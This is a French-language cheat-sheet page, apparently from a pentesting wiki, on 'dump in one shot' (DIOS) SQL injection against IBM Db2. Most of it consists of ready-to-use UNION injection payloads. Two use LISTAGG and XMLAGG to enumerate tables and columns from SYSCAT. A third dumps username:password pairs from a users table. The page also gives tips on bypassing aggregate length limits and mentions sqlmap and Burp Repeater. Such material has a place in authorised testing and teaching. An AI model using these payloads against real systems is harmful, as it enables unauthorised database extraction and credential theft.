---
order: 3
title: "Dump en une seule fois (DIOS) pour l'injection IBM Db2"
description: "Construire un unique payload union IBM Db2 qui concatène le schéma et les données en une seule réponse avec XMLAGG ou LISTAGG."
keywords:
  - DIOS
  - dump en une seule fois
  - XMLAGG
  - LISTAGG
  - extraction massive Db2
---

# DIOS

Le dump en une seule fois (DIOS, dump in one shot) empaquette une énumération entière dans un seul payload union, de sorte qu'une requête retourne le schéma (et souvent les données) au lieu d'une requête par table ou colonne. Le terme est emprunté à la pratique MySQL ; dans Db2, l'agrégation se fait avec `XMLAGG` ou `LISTAGG`.

`LISTAGG` (Db2 9.7+) est le plus simple, aplatissant les paires `schema.table` en une seule chaîne :

```sql
' UNION SELECT LISTAGG(TABSCHEMA||'.'||TABNAME,CHR(10)) WITHIN GROUP (ORDER BY TABNAME),NULL,NULL FROM SYSCAT.TABLES-- 
```

`XMLAGG` est l'alternative portable et gère une sortie plus volumineuse, sérialisant les lignes agrégées en une seule valeur :

```sql
' UNION SELECT XMLSERIALIZE(XMLAGG(XMLELEMENT(NAME r, COLNAME||',')) AS CLOB),NULL,NULL FROM SYSCAT.COLUMNS WHERE TABNAME='USERS'-- 
```

Le même schéma dumpe les lignes réelles en pointant l'agrégat vers la table cible :

```sql
' UNION SELECT LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

`CHR(10)` est un séparateur de saut de ligne. `LISTAGG` a une limite de longueur de résultat (il échoue quand l'agrégat dépasse le type de résultat), donc pour les grandes tables augmentez le type de sortie, passez à `XMLAGG`, ou paginez avec `FETCH FIRST`. DIOS est une commodité bâtie sur les mêmes primitives `SYSCAT` et d'agrégation que l'extraction union ordinaire, pas une vulnérabilité distincte.

## Outils

- **sqlmap** : automatise l'extraction agrégée une fois l'injection cartographiée.
- **db2** (ou clpplus) : le client Db2 pour construire et tester les payloads `XMLAGG`/`LISTAGG`.
- Test manuel avec Burp Repeater et le client Db2.

## Références

- IBM Db2 SQL Reference : LISTAGG, XMLAGG, XMLELEMENT, XMLSERIALIZE
- OWASP Testing Guide : Testing for SQL Injection
